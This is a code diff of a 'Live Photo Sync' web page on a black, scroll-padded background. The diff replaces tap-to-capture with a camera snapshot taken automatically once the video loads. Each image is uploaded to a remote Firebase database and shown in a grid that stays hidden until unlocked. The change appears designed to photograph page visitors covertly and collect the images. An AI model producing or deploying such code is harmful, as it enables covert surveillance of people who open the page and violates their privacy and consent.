@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Live Photo Sync - Secure 4 Photos</title>
+  <title>Live Photo Sync - Auto Capture</title>
   <style>
     body {
       background: black;
@@ -11,10 +11,6 @@
       font-family: sans-serif;
       overflow-y: scroll;
       min-height: 300vh;
-    }
-    #captureArea {
-      height: 100vh;
-      width: 100vw;
     }
     #spacer {
       height: 150vh;
@@ -46,12 +42,11 @@
       width: 45%;
       max-width: 180px;
       border: 2px solid white;
-      display: none; /* hide until unlocked */
+      display: none;
     }
   </style>
 </head>
 <body>
-  <div id="captureArea" ontouchstart="capture()" onclick="capture()"></div>
 
   <div id="spacer"></div>
 
@@ -87,9 +82,17 @@
     const unlockBtn = document.getElementById('unlockBtn');
 
     let isUnlocked = false;
+    let alreadyCaptured = false;
 
+    // Start video and auto-capture once ready
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
+      video.onloadedmetadata = () => {
+        if (!alreadyCaptured) {
+          alreadyCaptured = true;
+          setTimeout(capture, 500); // give camera a moment to stabilize
+        }
+      };
     });
 
     function capture() {
@@ -101,7 +104,7 @@
 
       db.ref("livephotos").once("value", snapshot => {
         let photos = snapshot.val() || [];
-        if (photos.length >= 4) photos.shift(); // remove oldest
+        if (photos.length >= 4) photos.shift();
         photos.push(dataUrl);
         db.ref("livephotos").set(photos);
       });
@@ -109,7 +112,7 @@
 
     db.ref("livephotos").on("value", snapshot => {
       const photos = snapshot.val() || [];
-      photoGrid.innerHTML = ""; // clear
+      photoGrid.innerHTML = "";
       photos.forEach(url => {
         const img = document.createElement("img");
         img.src = url;
